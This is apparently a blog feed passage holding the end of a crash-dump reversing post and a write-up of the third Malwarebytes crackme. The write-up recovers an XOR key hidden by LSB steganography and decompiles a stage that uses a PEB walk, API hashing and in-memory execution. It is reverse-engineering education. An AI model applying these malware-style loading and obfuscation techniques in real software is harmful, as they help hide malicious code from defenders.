80cdab10 00000000 0000003c 86b591f0
s4 s5 s6 s7
87a18b78 00000000 00000000 00000000
t8 t9 k0 k1
00000001 0000006e 00000000 00000000
gp sp s8 ra
810f1770 82637240 00000000 80972600
pc
80725134
sr    = 1000fc01
cause = 10000008
call procedure--
0x80972600--
0x80994e40--
0x80993ed0--
0x80993aa8--
0x80993984--
0x8099f718--
0x809931d4--
0x809a6b60--
0x809a86c0--
0x8099ba18--
0x8099b4bc--
0x809a5f20--

Stack:
82637240: fae33ffe 9e5bcec9 b3ebb644 fdfde7cd
82637250: 7729ed3a e11a6f6c bfedd7ed dfbf7a36
82637260: 93fdb2ee 9d89f697 ce5fc7f7 25edf589
82637270: f3afedaf a1799781 70fbad55 97e1f55c
82637280: 575ea857 b5b7fc8f 9ebcdbcd c8cd5ec1
82637290: f5cd6dd4 cf4bbb37 b7b08cdd de356661
826372a0: fff16cc7 28fbf9f9 aeb6a6ee ffefbf7b
826372b0: 905ff665 ded9bb9b 599b9ae9 2bfefbdf
826372c0: 75c3a5ed b5d7af7f ddbdf119 932f7837
826372d0: f4ffefaf fef72ff5 fcbf7ddd cd9bd338
826372e0: 6db5eff9 99a2e9f3 a5a6176c eda7f721
826372f0: b1f2b951 ef5c7f2f 3feba1a5 ed39efe5
82637300: c8b7bbf7 cf5968ca f599dfff ff771587
82637310: 7bc7927b fdb8bfea b7d8b725 945e0666
82637320: d87bd1bd a0faa875 00000000 1000fc01
</code></pre><p>It&rsquo;s also available in the file <code>flash:SYS_CORE_DUMP</code></p>
<p>Happy reversing.</p>
]]></content>
		</item>
		
		<item>
			<title>The Return of the Malwarebytes Crackme</title>
			<link>https://matth.dmz42.org/posts/2021/the-return-of-the-malwarebytes-crackme/</link>
			<pubDate>Mon, 08 Nov 2021 14:20:47 +0100</pubDate>
			
			<guid>https://matth.dmz42.org/posts/2021/the-return-of-the-malwarebytes-crackme/</guid>
			<description>Malwarebytes released their 3rd crackme, here&amp;rsquo;s my entry for the writeup contest.
You can find the original announcement here and the contest summary here.
0. First Look Running the crackme, we understand we&amp;rsquo;ll be asked to find 3 passwords. Only the first button is enabled, so they will most likely need to be found in order
Loading the binary into PE-bear reveals it&amp;rsquo;s a Dot Net binary
so let&amp;rsquo;s open it in dnSpy</description>
			<content type="html"><![CDATA[<p>Malwarebytes released their 3rd crackme, here&rsquo;s my entry for the writeup contest.<br>
You can find the original announcement <a href="https://matth.dmz42.org/posts/2021/the-return-of-the-malwarebytes-crackme/">here</a> and the contest summary <a href="https://blog.malwarebytes.com/threat-intelligence/2021/11/malwarebytes-crackme-contest-summary/">here</a>.</p>
<h2 id="0-first-look">0. First Look</h2>
<p>Running the crackme, we understand we&rsquo;ll be asked to find 3 passwords.
Only the first button is enabled, so they will most likely need to be found in order</p>
<p><img src="01-mainscreen.png" alt="Main Screen"></p>
<p>Loading the binary into PE-bear reveals it&rsquo;s a Dot Net binary</p>
<p><img src="02-pebear.png" alt="PE-bear"></p>
<p>so let&rsquo;s open it in dnSpy</p>
<p><img src="03-dnspy.png" alt="dnSpy"></p>
<p>It opens nicely, so far, so good.</p>
<h2 id="1-level-1">1. Level 1</h2>
<p>Browsing a little bit in dnSpy we quickly find the code behind the 3 buttons, so let&rsquo;s start with the first one:
<img src="10-l1-button.png" alt="button 1 action">
<img src="11-l1-vars.png" alt="variables"></p>
<p>It&rsquo;s basically calling a <code>decode</code> function with a resource named <code>mb_logo_star</code> as first parameter and our input password as 2nd parameter.
The resulting array is then resized to <strong>241152</strong> bytes and if its crc32 is <strong>2741486452</strong> the bytes are written to  <code>%TEMP%/level2.exe</code> and the newly created binary is executed.</p>
<p>It&rsquo;s safe to assume the <code>decode</code> function will use our input password to somehow decrypt an executable.</p>
<p>Let&rsquo;s start by extracting the resource, which is easily done with dnSpy:</p>
<p><img src="12-l1-save_img.png" alt="extract image"></p>
<p>and look at the <code>decode</code> function</p>
<p><img src="13-l1-decode.png" alt="decode function"></p>
<p>it uses LSB (Least Significant Bits) steganography to hide data:</p>
<ul>
<li>each pixel is represented by 3 color bytes Red, Green and Blue</li>
<li>the least 3 significant bits of the red and green values, and the 2 least significant bits of the blue are used to encode a total of 8bits per pixel</li>
<li>the resulting byte is then XOR&rsquo;d with our input password</li>
</ul>
<p>let&rsquo;s start by extracting the data with a simple script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">bm</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;mb_logo_star&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">convert</span><span class="p">(</span><span class="s1">&#39;RGB&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;l1_extract.bin&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">bm</span><span class="o">.</span><span class="n">width</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">bm</span><span class="o">.</span><span class="n">height</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="n">bm</span><span class="o">.</span><span class="n">getpixel</span><span class="p">((</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="n">num2</span> <span class="o">=</span> <span class="n">r</span> <span class="o">&amp;</span> <span class="mi">7</span>
</span></span><span class="line"><span class="cl">            <span class="n">num3</span> <span class="o">=</span> <span class="p">(</span><span class="n">g</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">            <span class="n">num4</span> <span class="o">=</span> <span class="p">(</span><span class="n">b</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span>
</span></span><span class="line"><span class="cl">            <span class="n">b</span> <span class="o">=</span> <span class="n">num2</span> <span class="o">|</span> <span class="n">num3</span> <span class="o">|</span> <span class="n">num4</span>
</span></span><span class="line"><span class="cl">            <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">b</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">))</span>
</span></span></code></pre></div><p>One thing with PE files, is that they contain quite a lot of contiguous NULL bytes, which if we are lucky could reveal the XOR key straight away</p>
<pre tabindex="0"><code>% xxd l1_extract.bin| more
[snip]
00000270: 845e 6b65 65a0 5c67 6f6b 6e67 21f9 6273  .^kee.\gokng!.bs
00000280: 795f 6c65 7665 6c5f 6f6e 655f 216c 6d2f  y_level_one_!lm/
00000290: 5d06 3a08 000d 655f 6061 725f 7085 5c61  ].:...e_`ar_p.\a
000002a0: 6e74 5f6b 65fb 735f 676f 696e 6721 6561  nt_ke.s_going!ea
000002b0: 7379 5f6c 2576 652e 5f6f 6e65 5f61 6c6d  sy_l%ve._one_alm
000002c0: 6f73 745f 646f 6e65 5f78 6f72 5f70 655f  ost_done_xor_pe_
000002d0: 616e 645f 6b65 6570 5f67 6f69 6e67 2165  and_keep_going!e
000002e0: 6173 795f 6c65 7665 6c5f 6f6e 655f 616c  asy_level_one_al
000002f0: 6d6f 7374 5f64 6f6e 655f 786f 725f 7065  most_done_xor_pe
00000300: 5f61 6e64 5f6b 6565 705f 676f 696e 6721  _and_keep_going!
00000310: 6561 7379 5f6c 6576 656c 5f6f 6e65 5f61  easy_level_one_a
00000320: 6c6d 6f73 745f 646f 6e65 5f78 6f72 5f70  lmost_done_xor_p
00000330: 655f 616e 645f 6b65 6570 5f67 6f69 6e67  e_and_keep_going
00000340: 2165 6173 795f 6c65 7665 6c5f 6f6e 655f  !easy_level_one_
00000350: 616c 6d6f 7374 5f64 6f6e 655f 786f 725f  almost_done_xor_
00000360: 7065 5f61 6e64 5f6b 6565 705f 676f 696e  pe_and_keep_goin
00000370: 6721 6561 7379 5f6c 6576 656c 5f6f 6e65  g!easy_level_one
00000380: 5f61 6c6d 6f73 745f 646f 6e65 5f78 6f72  _almost_done_xor
00000390: 5f70 655f 616e 645f 6b65 6570 5f67 6f69  _pe_and_keep_goi
000003a0: 6e67 2165 6173 795f 6c65 7665 6c5f 6f6e  ng!easy_level_on
000003b0: 655f 616c 6d6f 7374 5f64 6f6e 655f 786f  e_almost_done_xo
000003c0: 725f 7065 5f61 6e64 5f6b 6565 705f 676f  r_pe_and_keep_go
000003d0: 696e 6721 6561 7379 5f6c 6576 656c 5f6f  ing!easy_level_o
000003e0: 6e65 5f61 6c6d 6f73 745f 646f 6e65 5f78  ne_almost_done_x
000003f0: 6f72 5f70 655f 616e 645f 6b65 6570 5f67  or_pe_and_keep_g
00000400: 3ae2 82ec 646d 37f8 79d4 64ee 0669 eda6  :...dm7.y.d..i..
00000410: 6a6e 659f 1470 076f 1b14 be24 6f06 0dbe  jne..p.o...$o...
</code></pre><p>it&rsquo;s easy to notice the repeating string: <strong>easy_level_one_almost_done_xor_pe_and_keep_going!</strong></p>
<p>which turns out to be the correct key:</p>
<p><img src="14-l1-correct.png" alt="level1"></p>
<h2 id="2-level-2">2. Level 2</h2>
<p>We can confirm that the crackme spawned a new process (in this case with <code>procmon</code> from the <a href="https://docs.microsoft.com/en-us/sysinternals/">sysinternals suite</a>):</p>
<p><img src="20-l2-proc_level2.exe.png" alt="new process"></p>
<p>At this stage if we input some random password for level2, we get an error and the crackme exits</p>
<p><img src="21-l2-antidebug.png" alt="anti debug"></p>
<p>We can suspect it&rsquo;s because of procmon running: if we retry when it&rsquo;s not running, it does not happen.</p>
<p>The only way to know for sure is to take a look at this <strong>level2.exe</strong>, but first let&rsquo;s have a look at the action performed when we click the 2nd button of the crackme:</p>
<p><img src="23-l2_button2.png" alt="button 2 click"></p>
<p>it tries to connect to named pipe <code>crackme_pipe</code>, then writes our input password to it, reads something back, checks the CRC, and if it matches an expected value, calls <code>LoadNext.load(level2.exe_process, what_was_read_from_the_pipe)</code></p>
<p><code>LoadNext.Load()</code> will use the data read from the pipe to decrypt and load a Dot Net assembly:</p>
<p><img src="23-l2_button2_loadnext.png" alt="LoadNext"></p>
<p>and then call the <code>RunMe.Invoke(instance, level2.exe_process)</code> - most likely injecting code in the level2.exe process.</p>
<p>the key and IV are derived from the SHA256 hash of the password supplied to <code>AES.decryptContent</code>:</p>
<p><img src="23-l2_button2_decrypt.png" alt="AES decrypt"></p>
<p>We can assume the flow for level2 is:</p>
<ol>
<li><strong>frontend:</strong>   write input_password to pipe</li>
<li><strong>level2.exe:</strong> read input_password from pipe, do <em>something</em> and write something back to the pipe</li>
<li><strong>frontend:</strong> read <em>something</em> from the pipe</li>
<li><strong>frontend:</strong> derive AES IV and key from what was read from the pipe</li>
<li><strong>frontend:</strong> decrypt a Dot NET assembly</li>
<li><strong>frontend:</strong> probably do some code injection of some sort ?</li>
</ol>
<p>Time to look at <code>level2.exe</code>, we should find some code related to named pipes for sure.</p>
<h3 id="21-exploring-level2exe">2.1 Exploring level2.exe</h3>
<p>We can either XOR the content we extracted from the image with the password #1 and trim it to the correct size, or just copy the executable from %TEMP% - both work, but the second is a lesser effort.</p>
<p><img src="22-l2-temp_level2.png" alt="temp exec path"></p>
<p>This time it&rsquo;s not a Dot NET binary, so let&rsquo;s open it with our favorite disassembler/decompiler.
From the entry point, we can navigate down to the main function, which roughly look like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main_0</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="nc">_PEB</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_DWORD</span> <span class="o">*</span><span class="n">v5</span><span class="p">;</span> <span class="c1">// ecx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">size_t</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// esi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="p">(</span><span class="kr">__stdcall</span> <span class="o">*</span><span class="n">function_pointer</span><span class="p">)(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">void</span> <span class="o">**</span><span class="p">,</span> <span class="n">_DWORD</span><span class="p">,</span> <span class="n">size_t</span> <span class="o">*</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">v11</span><span class="p">)(</span><span class="kt">void</span><span class="p">);</span> <span class="c1">// ecx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">size_t</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [esp+8h] [ebp-4E4C0h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">v13</span><span class="p">;</span> <span class="c1">// [esp+Ch] [ebp-4E4BCh] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">320692</span><span class="p">];</span> <span class="c1">// [esp+10h] [ebp-4E4B8h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="c1">// register a Vectored Exception Handler
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">AddVectoredExceptionHandler</span><span class="p">(</span><span class="mi">1u</span><span class="p">,</span> <span class="n">Handler</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// do something with a buffer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x4E4B2u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">sub_4011D0</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_414000</span><span class="p">,</span> <span class="mi">160345</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">320690</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Size</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">  <span class="c1">// direct access to the PEB
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">v4</span> <span class="o">=</span> <span class="n">NtCurrentPeb</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">v4</span><span class="o">-&gt;</span><span class="n">ImageBaseAddress</span> <span class="o">+</span> <span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v5</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v5</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="n">v5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">++</span><span class="n">v6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="o">!</span><span class="n">v6</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="n">v5</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">v8</span> <span class="o">=</span> <span class="n">Size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="c1">// somehow get a function pointer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">function_pointer</span> <span class="o">=</span> <span class="n">sub_401250</span><span class="p">(</span><span class="n">v7</span><span class="p">,</span> <span class="mh">0xF4DD3DAD</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v13</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v12</span> <span class="o">=</span> <span class="n">v8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// execute this function
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">v10</span> <span class="o">=</span> <span class="n">function_pointer</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v13</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v12</span><span class="p">,</span> <span class="mi">1060864</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v11</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v10</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">v11</span> <span class="o">=</span> <span class="n">v13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">dword_43BAE0</span> <span class="o">=</span> <span class="n">v11</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v11</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// copy &#34;buffer&#34; somewhere else
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">memmove</span><span class="p">(</span><span class="n">v11</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="c1">// and execute it
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">dword_43BAE0</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">dword_43BAE0</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="o">-</span><span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>At first glance there&rsquo;s nothing much involving some sort of password checking or named pipe operation, however a few things stand out straight away:</p>
<ul>
<li>
<p>it registers a Vectored Exception Handler (VEH) via the <code>AddVectoredExceptionHandler(1, Handler)</code> call</p>
<ul>
<li>SEH/VEH can be used to obfuscate control flow (luckily there&rsquo;s no such thing here - we&rsquo;ll see what it is used for later on).</li>
</ul>
</li>
<li>
<p>it is directly accessing the PEB (Process Environment Block)</p>
<ul>
<li>PEB via FS:[0x30] and then _PEB_LDR_DATA via PEB+0xC</li>
<li>probably to get a list of loaded DLLs</li>
</ul>
</li>
</ul>
<p><img src="60-peb.jpg" alt="PEB"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">  <span class="c1">// direct access to the PEB
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">v4</span> <span class="o">=</span> <span class="n">NtCurrentPeb</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">v4</span><span class="o">-&gt;</span><span class="n">ImageBaseAddress</span> <span class="o">+</span> <span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v5</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v5</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="n">v5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">++</span><span class="n">v6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="o">!</span><span class="n">v6</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="n">v5</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
</span></span></code></pre></div><ul>
<li>it is dynamically getting a function pointer, based on a value which look like a hash</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">  <span class="c1">// somehow get a function pointer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">function_pointer</span> <span class="o">=</span> <span class="n">sub_401250</span><span class="p">(</span><span class="n">v7</span><span class="p">,</span> <span class="mh">0xF4DD3DAD</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v13</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v12</span> <span class="o">=</span> <span class="n">v8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// execute this function
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">v10</span> <span class="o">=</span> <span class="n">function_pointer</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v13</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v12</span><span class="p">,</span> <span class="mi">1060864</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span></code></pre></div><ul>
<li>it&rsquo;s transfering execution into memory</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">   <span class="n">dword_43BAE0</span> <span class="o">=</span> <span class="n">v11</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v11</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// copy &#34;buffer&#34; somewhere else
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">memmove</span><span class="p">(</span><span class="n">v11</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// and execute it
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">dword_43BAE0</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p>So it seems that it is using API hashing, a technique commonly used in malware to obfuscate API calls in order to unpack a second stage payload and transfert excution to it.
Let&rsquo;s dive into both.</p>
<h3 id="22-api-hashing">2.2 API Hashing</h3>
<p>API hashing is a common and pretty well documented technique, which dynamically resolves API functions.
As a result instead of directly calling:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">CreateThread</span><span class="p">(</span><span class="o">*</span><span class="n">params</span><span class="p">);</span>
</span></span></code></pre></div><p>one would do something like:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">ptr_CreateThread</span> <span class="o">=</span> <span class="n">get_func_by_hash</span><span class="p">(</span><span class="n">kernel32</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span> <span class="mh">0x11fc85fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">ptr_CreateThread</span><span class="p">(</span><span class="o">*</span><span class="n">params</span><span class="p">);</span>
</span></span></code></pre></div><p>with <code>0x11fc85fd</code> being a precalculated hash value of some sort for the string &ldquo;CreateThread&rdquo;.</p>
<p>I will not go into greater details of the internals of this technique as i am not the most skilled person to do so and would probably give incorrect information. It is also pretty well documented all over the internet, but basically, and i hope i am not already giving wrong information:</p>
<ol>
<li>access the PEB from where</li>
<li>get a list of loaded dll with their base address</li>
<li>from the base dll address, it can loop over the dll exports list</li>
<li>for each export, calculate the hash of the name</li>
<li>if this hash matches the hash we&rsquo;re looking for, returns the address of the function</li>
</ol>
<p>references:</p>
<ul>
<li><a href="https://0xevilc0de.com/locating-dll-name-from-the-process-environment-block-peb/">https://0xevilc0de.com/locating-dll-name-from-the-process-environment-block-peb/</a></li>
<li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/finding-kernel32-base-and-function-addresses-in-shellcode">https://www.ired.team/offensive-security/code-injection-process-injection/finding-kernel32-base-and-function-addresses-in-shellcode</a></li>
</ul>
<p>It&rsquo;s fair to say it makes static analysis more complicated.</p>
<p>From here we could reverse the hashing algorithm and apply it to all exports of common DLLs.
That would give us a list of common API funtions with their hash and an easy way to find a function name from its hash.</p>
<p>This is for example what <a href="https://github.com/mandiant/flare-ida">FLARE-IDA</a> is doing with <code>shellcode_hashes</code>. It&rsquo;s great if there&rsquo;s a lot of such obfuscated calls (note that you don&rsquo;t <em>need</em> IDA to use it, you can just directly query the sqlite db).</p>
<p>The function hashing algorithm used here looks like this:</p>
